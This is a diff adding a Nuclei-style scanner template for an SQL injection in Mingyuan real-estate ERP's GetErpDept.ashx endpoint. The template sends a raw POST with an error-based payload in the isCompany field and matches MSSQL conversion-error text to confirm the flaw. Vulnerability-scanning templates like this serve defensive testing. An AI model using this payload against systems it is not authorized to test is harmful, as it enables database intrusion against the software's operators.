@@ -1,0 +1,28 @@
+id: mingyuanERP-GetErpDept-sqli
+
+info:
+  name: 明源地产ERP GetErpDept.ashx 存在SQL注入漏洞
+  author: mingyuanERP
+  severity: high
+  tags: sqli
+
+http:
+  - raw:
+      - |
+        POST /XmjdUI/Handle/GetErpDept.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+
+        isCompany=') and 1=@@VERSION--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'nvarchar'
+          - 'Microsoft SQL Server'
+          - '转换成数据类型'
+        condition: and
